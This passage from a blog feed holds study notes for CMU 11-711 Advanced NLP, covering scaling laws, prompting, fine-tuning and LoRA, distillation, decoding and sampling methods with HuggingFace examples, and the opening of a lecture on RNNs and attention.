src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206233726326.png" alt="image-20260206233726326" style="zoom:40%;" /></p><h3 id="model-size-scaling">Model Size Scaling</h3><p><span class="math display">\[L = (N / N_c)^{-b}\]</span></p><ul><li>Larger models are more <strong>sample-efficient</strong> (reachlower loss with fewer tokens)</li><li>Transformers scale significantly better than LSTMs</li></ul><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206233840078.png"alt="image-20260206233840078" /><figcaption aria-hidden="true">image-20260206233840078</figcaption></figure><h3 id="compute-optimal-training">Compute-Optimal Training</h3><table><colgroup><col style="width: 48%" /><col style="width: 9%" /><col style="width: 9%" /><col style="width: 32%" /></colgroup><thead><tr class="header"><th>Paper</th><th>N_opt</th><th>D_opt</th><th>Implication</th></tr></thead><tbody><tr class="odd"><td>Kaplan et al. 2020</td><td>∝ C⁰·⁷³</td><td>∝ C⁰·²⁷</td><td>Prioritize bigger models</td></tr><tr class="even"><td><strong>Chinchilla</strong> (Hoffmann et al. 2022)</td><td>∝ C⁰·⁵</td><td>∝ C⁰·⁵</td><td><strong>Scale N and D equally</strong></td></tr></tbody></table><p><strong><u>∝ means proportional to</u></strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206234520100.png" alt="image-20260206234520100" style="zoom:40%;" /></p><p>Chinchilla’s insight: many existing LLMs (e.g., Gopher 280B) were<strong>undertrained</strong>. This directly influenced LLaMA’s design —smaller models trained on much more data.</p><blockquote><p>Run small-scale experiments → fit scaling laws → extrapolate optimalhyperparameters (model size, tokens, batch size, learning rate) for theexpensive target run.</p></blockquote><h2 id="prompting-and-in-context-learning">Prompting and In-ContextLearning</h2><h3 id="three-prompting-strategies">Three Prompting Strategies</h3><table><colgroup><col style="width: 15%" /><col style="width: 34%" /><col style="width: 50%" /></colgroup><thead><tr class="header"><th>Strategy</th><th>Format</th><th>Key Issue</th></tr></thead><tbody><tr class="odd"><td>No prompt</td><td>Raw text completion</td><td>Uncontrollable</td></tr><tr class="even"><td>Zero-shot</td><td>Instruction + input</td><td>Output format unstable; wording-sensitive</td></tr><tr class="odd"><td>Few-shot (ICL)</td><td>Instruction + K examples + input</td><td>Examples define format &amp; task; no param updates</td></tr></tbody></table><h3 id="icl-phenomena-agarwal-et-al.-2024">ICL Phenomena (Agarwal etal. 2024)</h3><ul><li><strong>Task retrieval</strong>: sometimes input-only examples workas well as (input, output) pairs — ICL partly “retrieves” pretrainingpatterns rather than learning new mappings</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235526522.png" alt="image-20260206235526522" style="zoom:40%;" /></p><ul><li><p><strong>Pretraining bias</strong>: default labels need few shots;flipped/abstract labels need many more to overcome built-inassociations</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235557572.png" alt="image-20260206235557572" style="zoom:30%;" /></p></li><li><p><strong>Sensitivity</strong>: example ordering, label balance,and label coverage all significantly affect performance (Lu et al. 2021;Zhang et al. 2022)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235916474.png" alt="image-20260206235916474" style="zoom:30%;" /></p></li><li><p><strong>Model variation</strong>: ability to benefit frommany-shot varies greatly (Gemini 1.5 Pro improves up to 1024-shot;GPT-4-Turbo plateaus early)</p></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235954906.png" alt="image-20260206235954906" style="zoom:33%;" /></p><h3 id="chat-prompts">Chat Prompts</h3><p>Messages format with <strong>system</strong> / <strong>user</strong>/ <strong>assistant</strong> roles → tokenizer converts to string withspecial tokens. System prompts define model behavior (reasoningstrategy, safety rules, output format, etc.).</p><h3 id="chain-of-thought-cot">Chain-of-Thought (CoT)</h3><ul><li><strong>Few-shot CoT</strong> (Wei et al. 2022): include reasoningsteps in examples</li><li><strong>Zero-shot CoT</strong> (Kojima et al. 2022): append “Let’sthink step by step”</li><li>Key insight: CoT gives the model <strong>adaptive computationtime</strong> — each reasoning token is an extra forward pass</li></ul><h3 id="prompt-chains">Prompt Chains</h3><p>Chain multiple LLM calls (with different prompts / external tools)sequentially:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input → LLM₁ → intermediate → LLM₂ → intermediate → ... → output</span><br></pre></td></tr></table></figure><p>Enables problem decomposition, tool use (search, code execution), andmulti-step reasoning.</p><hr /><h1 id="lec8-fine-tuning">Lec8 Fine-Tuning</h1><h3 id="what-is-fine-tuning">What is Fine-Tuning?</h3><p>Continued gradient-based training of a pre-trained model ontask-specific data. Given pre-trained parameters θ₀ and dataset D = {(x,y)ₙ}: <span class="math display">\[\theta^* = \arg\min_\theta \mathbb{E}_{(x,y)\sim D}[\mathcal{L}(f_\theta(x), y)]\]</span> Also called <strong>Supervised Fine-Tuning (SFT)</strong>. Useregularization/dropout to prevent overfitting.</p><h3 id="two-fine-tuning-paradigms">Two Fine-Tuning Paradigms</h3><p><strong>Classification fine-tuning</strong>: Add a linear head on thelast hidden state. <span class="math display">\[p_\theta(y \mid x) = \text{softmax}(Wh + b), \quad W \in \mathbb{R}^{K\times d}, \; b \in \mathbb{R}^K\]</span></p><ul><li>Loss: cross-entropy <span class="math inline">\(\mathcal{L} = -\logp_\theta(y \mid x)\)</span></li><li>Update all parameters <span class="math inline">\(\theta =(\theta_0, W, b)\)</span></li></ul><p><strong>Language model fine-tuning</strong>: Keep the LMarchitecture, train on (input, output) pairs.</p><p>Keep the LM architecture, train on (input, output) pairs. Concatenateas <code>[start] x [sep] y [end]</code>, compute loss <strong>only onoutput tokens</strong>:</p><p><span class="math display">\[\mathcal{L}_{\text{MLE}} = -\sum_{t=1}^{T} \log p_\theta(y_t \mid x,y_{&lt;t})\]</span> No additional head needed — uses the existing LM head.</p><h3 id="which-parameters-to-update">Which Parameters to Update?</h3><table><colgroup><col style="width: 14%" /><col style="width: 21%" /><col style="width: 7%" /><col style="width: 56%" /></colgroup><thead><tr class="header"><th>Option</th><th>What’s Updated</th><th>Cost</th><th>Trade-off</th></tr></thead><tbody><tr class="odd"><td>Head only</td><td><span class="math inline">\(K \times d + K\)</span> params</td><td>Cheapest</td><td>Assumes pre-trained representations are already linearlyseparable</td></tr><tr class="even"><td>Full fine-tuning</td><td>All</td><td><span class="math inline">\(\theta\)</span></td><td>May lead to overfitting</td></tr><tr class="odd"><td><strong>PEFT</strong></td><td>Small subset</td><td><span class="math inline">\(\theta\)</span></td><td>Can change the representations</td></tr></tbody></table><h3 id="lora-low-rank-adaptation-hu-et-al.-2021">LoRA (Low-RankAdaptation) [Hu et al. 2021]</h3><p>Key idea: approximate weight updates with low-rank matrices.</p><p>For weight <span class="math inline">\(W_0 \in \mathbb{R}^{d \timesd&#39;}\)</span>, decompose the update as:</p><p><span class="math display">\[\Delta W = BA, \quad B \in \mathbb{R}^{d \times r}, \; A \in\mathbb{R}^{r \times d&#39;}, \; r \ll \min(d, d&#39;)\]</span></p><ul><li>Freeze <span class="math inline">\(W_0\)</span>, only train <spanclass="math inline">\(A\)</span> and <spanclass="math inline">\(B\)</span></li><li>Final weight: <span class="math inline">\(W = W_0 + \frac{\alpha}{r}\cdot BA\)</span></li><li>Typically applied to <span class="math inline">\(W_q\)</span> and<span class="math inline">\(W_v\)</span> in attention layers</li><li>After training, merge <span class="math inline">\(\Delta W\)</span>into <span class="math inline">\(W_0\)</span> → <strong>no extrainference cost</strong></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207002605984.png" alt="image-20260207002605984" style="zoom:33%;" /></p><h3 id="effects-of-fine-tuning">Effects of Fine-Tuning</h3><p><strong>Data efficiency</strong>: Pre-trained models reach goodperformance with far fewer examples than training from scratch (Howard&amp; Ruder 2018 — ULMFiT).</p><p><strong>Distribution narrowing</strong>: Fine-tuning minimizes <spanclass="math inline">\(D_{\text{KL}}(p_{\text{finetune}} \|p_\theta)\)</span> instead of <spanclass="math inline">\(D_{\text{KL}}(p_{\text{data}} \|p_\theta)\)</span>. The model’s distribution becomes narrower andspecialized.</p><p><strong>Side effects</strong>:</p><ul><li>Summarization model fails at translation (lost generality)</li><li>Model becomes dependent on exact prompt formatting used duringtraining</li><li>Few-shot learning ability may degrade after fine-tunin</li></ul><hr /><h2 id="instruction-tuning">Instruction Tuning</h2><p>Fine-tune a model on (instruction + input, output) pairs across<strong>multiple tasks</strong>, so it learns to follow instructionsgenerically.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207002839337.png" alt="image-20260207002839337" style="zoom: 33%;" /></p><h3 id="chat-tuning">Chat Tuning</h3><p>Chat is just instruction tuning with conversational format:</p><ul><li>System prompt + [user, assistant, user, assistant, …]</li><li>Special tokens mark role boundaries (e.g.,<code>&lt;|start_header_id|&gt;user&lt;|end_header_id|&gt;</code>)</li><li>Instruction + input are implicitly embedded in the conversation</li></ul><p><strong>Data sources</strong>: OpenOrca (16 hand-written systemprompts, GPT-4 outputs, 2.9M examples), LMSys-1M (real userconversations from online LLM service)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207002950797.png" alt="image-20260207002950797" style="zoom:33%;" /></p><h2 id="knowledge-distillation">Knowledge Distillation</h2><p>Use a strong <strong>teacher</strong> model to train a smaller<strong>student</strong> model. Both approaches minimize <spanclass="math inline">\(D_{\text{KL}}(q \| p_\theta)\)</span> betweenteacher <span class="math inline">\(q\)</span> and student <spanclass="math inline">\(p_\theta\)</span>.</p><h3 id="token-level-distillation-hinton-et-al.-2015">Token-LevelDistillation [Hinton et al. 2015]</h3><p>Student mimics teacher’s <strong>full probabilitydistribution</strong> at each token position:</p><p><span class="math display">\[\mathcal{L}_{\text{distill}} = -\sum_{y_t \in V} q(y_t \mid y_{&lt;t},x) \cdot \log p_\theta(y_t \mid y_{&lt;t}, x)\]</span></p><ul><li>Uses <strong>soft labels</strong> (teacher’s distribution) insteadof hard one-hot labels</li><li>Requires access to teacher’s logits</li><li>Richer signal than standard cross-entropy (which only uses thecorrect token)</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207003122001.png" alt="image-20260207003122001" style="zoom: 25%;" /></p><h3 id="sequence-level-distillation-kim-rush-2016">Sequence-LevelDistillation [Kim &amp; Rush 2016]</h3><p>Teacher <strong>generates</strong> complete outputs; studentfine-tunes on them:</p><p><span class="math display">\[\mathcal{L}_{\text{seq}} = \mathbb{E}_{y \sim q(y|x)} \left[-\logp_\theta(y \mid x)\right]\]</span></p><ul><li>Only needs teacher’s generated text, not logits (black-boxfriendly)</li><li>Example: DeepSeek-R1-Distill-Qwen-7B = Qwen-7B fine-tuned onDeepSeek-R1’s outputs</li><li>Mathematically also minimizes <spanclass="math inline">\(D_{\text{KL}}(q \| p_\theta)\)</span>, just withMonte Carlo approximation</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207003300579.png" alt="image-20260207003300579" style="zoom: 25%;" /></p><h3 id="augmented-teacher-west-et-al.-2022">Augmented Teacher [West etal. 2022]</h3><p>Teacher can be an <strong>augmented</strong> LLM:</p><p><span class="math display">\[q \propto p_{\text{LLM}}(y \mid x) \cdot A(x, y)\]</span> where <span class="math inline">\(A\)</span> is aclassifier/verifier. If the augmented teacher is better than <spanclass="math inline">\(p_{\text{LLM}}\)</span> alone, the distilledstudent can <strong>surpass</strong> <spanclass="math inline">\(p_{\text{LLM}}\)</span> — the student becomesbetter than its base teacher through filtered/verified data.</p><h1 id="lec9-decoding-algorithms">Lec9 Decoding Algorithms</h1><h2 id="basic-setup">Basic Setup</h2><h3 id="autoregressive-language-model">Autoregressive LanguageModel</h3><p><span class="math display">\[p_\theta(y_{1:T} | x) = \prod_{t=1}^{T} p_\theta(y_t | y_{&lt;t}, x)\]</span></p><h3 id="next-token-distribution">Next-Token Distribution</h3><p>Each term <span class="math inline">\(p_\theta(y_t | y_{&lt;t},x)\)</span> gives us a probability distribution over next tokens.</p><p><strong>Decoding</strong>: Choose next tokens so that we end up withan output <span class="math inline">\(y_{1:T}\)</span>.</p><hr /><h2 id="decoding-as-optimization">Decoding as Optimization</h2><h3 id="goal-map-decoding">Goal: MAP Decoding</h3><p>Find the most likely output: <span class="math display">\[\hat{y} = \arg\max_{y \in \mathcal{Y}} p_\theta(y | x)\]</span></p><ul><li>Also called <strong>mode-seeking</strong> or <strong>maximuma-posteriori (MAP)</strong></li><li>Key challenge: output space <spanclass="math inline">\(\mathcal{Y}\)</span> is very large</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210155455010.png" alt="image-20260210155455010" style="zoom:50%;" /></p><h3 id="approach-1-greedy-decoding">Approach 1: Greedy Decoding</h3><p>For <span class="math inline">\(t = 1 \ldots \text{End}\)</span>:<span class="math display">\[\hat{y}_t = \arg\max_{y_t \in V} p_\theta(y_t | \hat{y}_{&lt;t}, x)\]</span></p><p><strong>Limitation</strong>: Does not guarantee the most-likelysequence.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210155537243.png" alt="image-20260210155537243" style="zoom:30%;" /></p><h3 id="approach-2-beam-search">Approach 2: Beam Search</h3><ul><li>Width-limited breadth-first search</li><li>Maintain <span class="math inline">\(B\)</span> likely paths at eachstep</li><li><span class="math inline">\(B = 1\)</span>: greedy decoding</li><li><span class="math inline">\(B = |V|^{T_{\max}}\)</span>: exact MAP(intractable)</li><li>In practice: <span class="math inline">\(B = 16\)</span>(hyperparameter)</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210155609745.png" alt="image-20260210155609745" style="zoom:30%;" /></p><p><strong>HuggingFace interface</strong>: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Greedy</span></span><br><span class="line">model.generate(do_sample=<span class="literal">False</span>, num_beams=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Beam search</span></span><br><span class="line">model.generate(do_sample=<span class="literal">False</span>, num_beams=<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p><h3 id="pitfalls-of-map-decoding">Pitfalls of MAP Decoding</h3><p><strong>1. Degeneracy</strong> - <strong>Repetition traps</strong>:Models assign high probability to repetitive loops - <strong>Shortsequences</strong>: Highest-probability sequence might be empty -Remedy: length normalization</p><p><strong>2. Atypicality</strong> - Most likely outcome ≠ typicaloutcome - Example: Biased coin <span class="math inline">\(\Pr[H] =0.6\)</span>, most likely outcome of 100 flips is all heads(atypical!)</p><p><strong>3. Probability spread</strong> - When multiple ways exist toexpress the same thing, probability spreads across variants -Highest-probability output may not be the “best”</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210160105078.png" alt="image-20260210160105078" style="zoom:25%;" /></p><hr /><h2 id="sampling">Sampling</h2><h3 id="ancestral-sampling">Ancestral Sampling</h3><p>For <span class="math inline">\(t = 1 \ldots \text{End}\)</span>:<span class="math display">\[\hat{y}_t \sim p_\theta(y_t | \hat{y}_{&lt;t}, x)\]</span></p><ul><li>Equivalent to sequence sampling: <span class="math inline">\(y_{1:T}\sim p_\theta(y_{1:T} | x)\)</span></li><li>Implemented via categorical sampling (PyTorch, etc.)</li></ul><p><strong>HuggingFace interface</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.generate(do_sample=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="problems-with-ancestral-sampling">Problems with AncestralSampling</h3><p><strong>Heavy tail problem</strong>:</p><ul><li>Even if each bad token has small probability, sum of bad tokens hasnontrivial probability</li><li>Leads to incoherence</li></ul><p><strong>Compounding error</strong>: - Probability of sampling no badtokens: <span class="math inline">\((1 - \epsilon)^T\)</span> - Example:<span class="math inline">\(\epsilon = 0.01, T = 128 \Rightarrowp(\text{no bad tokens}) = 0.276\)</span></p><h3 id="workaround-truncate-the-tail">Workaround: Truncate the Tail</h3><p><strong>Top-k Sampling</strong>: Sample only from <spanclass="math inline">\(k\)</span> most-probable tokens <spanclass="math display">\[\hat{y}_t \sim \begin{cases}p_\theta(y_t | y_{&lt;t}, x) / Z_t &amp; \text{if } y_t \text{ in top-}k\\0 &amp; \text{otherwise}\end{cases}\]</span></p><p><strong>Top-p Sampling</strong>: Sample only from top <spanclass="math inline">\(p\)</span> probability mass</p><p><strong>Temperature Sampling</strong>: Make distribution more peaked<span class="math display">\[\text{softmax}(x, \tau) = \frac{\exp(x/\tau)}{\sum_i \exp(x_i/\tau)}\]</span></p><table><thead><tr class="header"><th>Temperature</th><th>Parameter</th><th>Pro</th><th>Con</th></tr></thead><tbody><tr class="odd"><td>High</td><td><span class="math inline">\(\tau \geq 1\)</span></td><td>Diverse</td><td>Incoherent</td></tr><tr class="even"><td>Low</td><td><span class="math inline">\(\tau &lt; 1\)</span></td><td>Coherent</td><td>Repetitive</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210161335068.png" alt="image-20260210161335068" style="zoom:30%;" /></p><p><strong>HuggingFace interface</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Top-k</span></span><br><span class="line">model.generate(do_sample=<span class="literal">True</span>, top_k=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Top-p</span></span><br><span class="line">model.generate(do_sample=<span class="literal">True</span>, top_p=<span class="number">0.9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Temperature</span></span><br><span class="line">model.generate(do_sample=<span class="literal">True</span>, temperature=<span class="number">0.7</span>)</span><br></pre></td></tr></table></figure><h3 id="other-truncation-strategies">Other Truncation Strategies</h3><table><thead><tr class="header"><th>Method</th><th>Threshold Strategy</th></tr></thead><tbody><tr class="odd"><td>Top-<span class="math inline">\(k\)</span></td><td>Sample from <spanclass="math inline">\(k\)</span>-most-probable</td></tr><tr class="even"><td>Top-<span class="math inline">\(p\)</span></td><td>Cumulative probability at most <spanclass="math inline">\(p\)</span></td></tr><tr class="odd"><td><span class="math inline">\(\epsilon\)</span></td><td>Probability at least <spanclass="math inline">\(\epsilon\)</span></td></tr><tr class="even"><td><span class="math inline">\(\eta\)</span></td><td>Min prob. proportional to entropy</td></tr><tr class="odd"><td>Min-<span class="math inline">\(p\)</span></td><td>Prob. at least <span class="math inline">\(p_{\min}\)</span> scaledby max token prob.</td></tr></tbody></table><hr /><h2 id="speeding-up-decoding">Speeding Up Decoding</h2><h3 id="why-is-decoding-slow">Why is Decoding Slow?</h3><p><strong>Time bottleneck</strong>: <span class="math display">\[\text{time} =\max\left(\frac{\text{OperationFLOPs}}{\text{DeviceFLOP/s}},\frac{\text{DataTransferred(GB)}}{\text{MemoryBandwidth(GB/s)}}\right)\]</span></p><ul><li><strong>Compute-bound</strong>: e.g., <span class="math inline">\(A= BC\)</span> (matrix multiplication)</li><li><strong>Memory-bound</strong>: e.g., <span class="math inline">\(a =Bx\)</span> (matrix-vector multiplication)</li><li>Decoding one token is typically <strong>memory-bound</strong></li></ul><h3 id="metrics">Metrics</h3><p><strong>Latency</strong>: How long does a user wait? - Time to firsttoken, time per request</p><p><strong>Throughput</strong>: How many requests completed per second?- Tokens per second, requests per second</p><h3 id="key-value-cache">Key-Value Cache</h3><p><strong>Problem</strong>: Without caching, computing attentionrequires <span class="math inline">\(O(T^2)\)</span> recomputation.</p><p><strong>Solution</strong>: Store previously computed keys andvalues.</p><p>At step <span class="math inline">\(t\)</span> of decoding (1 layer,1 head): <span class="math display">\[\begin{align}q_t &amp;= h_t W_q \in \mathbb{R}^{1 \times d_k} \\k_t &amp;= h_t W_K \in \mathbb{R}^{1 \times d_k} \\v_t &amp;= h_t W_V \in \mathbb{R}^{1 \times d_v}\end{align}\]</span></p><p>Cached: <span class="math inline">\(K_{1:t-1} \in \mathbb{R}^{(t-1)\times d_k}\)</span>, <span class="math inline">\(V_{1:t-1} \in\mathbb{R}^{(t-1) \times d_v}\)</span></p><p>Append <span class="math inline">\(k_t\)</span> to <spanclass="math inline">\(K_{1:t-1}\)</span> and <spanclass="math inline">\(v_t\)</span> to <spanclass="math inline">\(V_{1:t-1}\)</span>: <span class="math display">\[z_t = \text{softmax}\left(\frac{q_t K_{1:t}^T}{\sqrt{d_k}}\right)V_{1:t}\]</span></p><p><strong>Speedup</strong>: Reduces <spanclass="math inline">\(O(T^2)\)</span> to <spanclass="math inline">\(O(T)\)</span> computation.</p><h3 id="speeding-up-a-single-token">Speeding Up a Single Token</h3><table><colgroup><col style="width: 23%" /><col style="width: 38%" /><col style="width: 38%" /></colgroup><thead><tr class="header"><th>Goal</th><th>Strategy</th><th>Examples</th></tr></thead><tbody><tr class="odd"><td>Reduce memory bandwidth</td><td>Quantization, distillation, architecture</td><td>GPTQ, AWQ, GQA/MQA</td></tr><tr class="even"><td>Increase FLOP/s</td><td>Optimize operations on hardware</td><td>FlashAttention, torch.compile</td></tr><tr class="odd"><td>Decrease FLOPs</td><td>Reduce FLOPs in architecture</td><td>Mixture-of-Experts, Mamba</td></tr></tbody></table><h3 id="speeding-up-a-full-sequence">Speeding Up a Full Sequence</h3><table><colgroup><col style="width: 38%" /><col style="width: 23%" /><col style="width: 38%" /></colgroup><thead><tr class="header"><th>Strategy</th><th>Idea</th><th>Examples</th></tr></thead><tbody><tr class="odd"><td>Parallelize over time</td><td>Draft tokens cheaply, verify in parallel</td><td>Speculative decoding</td></tr><tr class="even"><td>Parallelize over time</td><td>Generate multiple tokens in parallel</td><td>Non-autoregressive models</td></tr></tbody></table><p><strong>Speculative Decoding</strong>: 1. Use small <strong>draftmodel</strong> <span class="math inline">\(q\)</span> to generate tokensahead 2. Large model <span class="math inline">\(p\)</span> processesdrafted tokens in parallel 3. Accept with probability: <spanclass="math inline">\(\alpha_i = \min\left(1, \frac{p(\text{token} |\ldots)}{q(\text{token} | \ldots)}\right)\)</span></p><h3 id="speeding-up-multiple-sequences">Speeding Up MultipleSequences</h3><table><colgroup><col style="width: 38%" /><col style="width: 23%" /><col style="width: 38%" /></colgroup><thead><tr class="header"><th>Strategy</th><th>Idea</th><th>Examples</th></tr></thead><tbody><tr class="odd"><td>State re-use</td><td>Shared prefixes <span class="math inline">\(\Rightarrow\)</span>shared KV cache</td><td>PagedAttention, RadixAttention</td></tr><tr class="even"><td>Improved batching</td><td>Better scheduling</td><td>Continuous batching</td></tr><tr class="odd"><td>Program-level optimization</td><td>Optimize full generation graph</td><td>SGLang, DSPy</td></tr></tbody></table><hr /><h2 id="summary">Summary</h2><ol type="1"><li><strong>Decoding as optimization</strong>: Greedy, beam search, MAP(A fixed route the maxmize the probability )<ul><li>Pitfalls: degeneracy, atypicality, probability spread</li></ul></li><li><strong>Sampling</strong>: Ancestral, top-k, top-p, temperature.(change the probability distribution for the following sampling)<ul><li>Addresses tail probability and diversity issues</li></ul></li><li><strong>Efficient inference</strong>: KV cache, speculativedecoding, batching<ul><li>Critical for deployment at scale</li></ul></li></ol><blockquote><p>A key takeaway is that the Beam search or Greedy is search-based, itwants to get a fiexd optimized output, but Samlping introduces diversityor variance to generate more creative answers and may get differentanswers.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 Advanced NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11711 Advanced NLP: Architectures</title>
      <link href="/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/"/>
      <url>/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/</url>
      
        <content type="html"><![CDATA[<h1 id="lec4-recurrent-neural-networks">Lec4 Recurrent NeuralNetworks</h1><p><strong>Motivation:</strong> N-gram and feedforward models havelimited context (N-1 tokens). RNNs provide theoretically infinitecontext.</p><h2 id="three-types-of-sequence-models">Three Types of SequenceModels</h2><ul><li><strong>Recurrence:</strong> Condition representations on anencoding of history</li><li><strong>Convolution:</strong> Condition representations on localcontext</li><li><strong>Attention:</strong> Condition representations on weightedaverage of all tokens</li></ul><h2 id="basic-rnn-elman-1980">Basic RNN (Elman, 1980)</h2><p>A sequence model <span class="math inline">\(f_\theta(x_1, \ldots,x_{|x|}) \rightarrow h_1, \ldots, h_{|x|}\)</span> that transforms ahidden state at each step:</p><p><span class="math display">\[h_t = \sigma(W_h h_{t-1} + W_x x_t +b)\]</span></p><p>where <span class="math inline">\(\sigma\)</span> is activation(tanh, relu), <span class="math inline">\(h_t \in \mathbb{R}^d\)</span>is hidden state, parameters <span class="math inline">\(\theta = \{W_h\in \mathbb{R}^{d \times d}, W_x \in \mathbb{R}^{d \times d_{in}}, b \in\mathbb{R}^d\}\)</span></p><p><strong>For language modeling:</strong> <spanclass="math inline">\(p_\theta(\cdot \mid x_{&lt;t}) = \text{softmax}(Wh_t)\)</span></p><h2 id="rnn-training">RNN Training</h2><p><strong>Backpropagation Through Time (BPTT):</strong> Unroll the RNNinto a DAG computation graph, run standard backprop.</p><ul><li>Same parameters at each step; gradients are accumulated</li><li>Training objective (MLE): <span class="math inline">\(\min -\sum_{x\in D_{train}} \sum_t \log p_\theta(x_t \mid x_{&lt;t})\)</span></li><li><strong>Parallelization is difficult:</strong> Computing loss atstep <span class="math inline">\(t\)</span> requires <spanclass="math inline">\(h_t\)</span>, which depends on <spanclass="math inline">\(h_{t-1}, h_{t-2}, \ldots\)</span></li></ul><h2 id="rnn-inference">RNN Inference</h2><p>Generate one token → use new hidden state → repeat until<code>[EOS]</code></p><ul><li><strong>Pros:</strong> Only need to store previous hidden state(constant memory), <span class="math inline">\(O(1)\)</span> per step,<span class="math inline">\(O(T)\)</span> total for length <spanclass="math inline">\(T\)</span></li><li><strong>Cons:</strong> Sequential, cannot parallelize</li></ul><h2 id="vanishing-gradients">Vanishing Gradients</h2><p>Gradients decrease as they propagate back: <spanclass="math inline">\(\frac{\partial L}{\partial h_0}\)</span> becomestiny.</p><p><strong>Why?</strong> <span class="math inline">\(\frac{\partialh_T}{\partial h_t} = \prod_{t&#39;=t}^{T} \frac{\partialh_{t&#39;+1}}{\partial h_{t&#39;}}\)</span>, where <spanclass="math inline">\(\frac{\partial h_{t&#39;+1}}{\partial h_{t&#39;}}= \text{diag}(\tanh&#39;(\cdot)) W\)</span></p><p>When dominant eigenvalue of <span class="math inline">\(W &lt;1\)</span>, gradients vanish exponentially.<strong>Implication:</strong> Cannot model long-range dependencies!</p><h2 id="gating-the-solution">Gating: The Solution</h2><p><strong>Basic idea:</strong> Pass information across timesteps withlearned gates.</p><p><span class="math display">\[h_t = (1 - z_t) \odot h_{t-1} + z_t\odot \tilde{h}_t\]</span></p><p>where <span class="math inline">\(z_t = \sigma(W_z x_t + U_zh_{t-1})\)</span> is update gate, <spanclass="math inline">\(\tilde{h}_t\)</span> is candidate state.</p><ul><li>When <span class="math inline">\(z \to 0\)</span>: retain long-terminfo (<span class="math inline">\(\frac{\partial h_{t_2}}{\partialh_{t_1}} = 1\)</span>)</li><li>When <span class="math inline">\(z &gt; 0\)</span>: incorporate newhidden state</li></ul><h3 id="gru-cho-et-al.-2014">GRU (Cho et al., 2014)</h3><p>2-gate architecture: - <strong>Update gate</strong> <spanclass="math inline">\(z_t\)</span>: should I update the previous hiddenstate? - <strong>Reset gate</strong> <span class="math inline">\(r_t =\sigma(W_r x_t + U_r h_{t-1})\)</span>: should I use hidden state inupdate?</p><p><span class="math display">\[\hat{h}_t = \tanh(W_h x_t + U_h(r_t\odot h_{t-1})), \quad h_t = (1-z_t) \odot h_{t-1} + z_t \odot\hat{h}_t\]</span></p><h3 id="lstm-hochreiter-schmidhuber-1997">LSTM (Hochreiter &amp;Schmidhuber, 1997)</h3><p>4-gate architecture with additional context vector. In practice,GRU/LSTM are drop-in replacements for vanilla RNN.</p><h2 id="encoder-decoder">Encoder-Decoder</h2><p><strong>Motivation:</strong> Conditional generation <spanclass="math inline">\(p_\theta(y_1, \ldots, y_T \mid x)\)</span> (e.g.,translation, summarization)</p><p><strong>Architecture:</strong> Encode input <spanclass="math inline">\(x\)</span> into context vector <spanclass="math inline">\(c \in \mathbb{R}^d\)</span>, use it in decoder: -Initialize decoder hidden state - Include in recurrent update: <spanclass="math inline">\(W[h_t; x_t; c]\)</span> - Include in output layer:<span class="math inline">\(\text{softmax}(W[h_t; c])\)</span></p><p><strong>Training:</strong> <span class="math inline">\(\min_\theta\sum_{(x,y) \in D} \sum_t -\log p_\theta(y_t \mid y_{&lt;t},x)\)</span></p><p><strong>Limitation:</strong> Single context vector for all tokens —can we do better?</p><h2 id="attention-bahdanau-et-al.-2015">Attention (Bahdanau et al.,2015)</h2><p><strong>Key idea:</strong> Compute a different context vector at eachdecoder step as a weighted sum of encoder states.</p><ul><li><strong>Keys:</strong> Encoder states <spanclass="math inline">\(h_1^{enc}, \ldots, h_N^{enc}\)</span></li><li><strong>Query:</strong> Current decoder hidden state <spanclass="math inline">\(h\)</span></li><li><strong>Attention scores:</strong> <spanclass="math inline">\(\alpha_n = \text{score}(h,h_n^{enc})\)</span></li><li><strong>Context vector:</strong> <span class="math inline">\(c =\sum_{n=1}^{N} \alpha_n 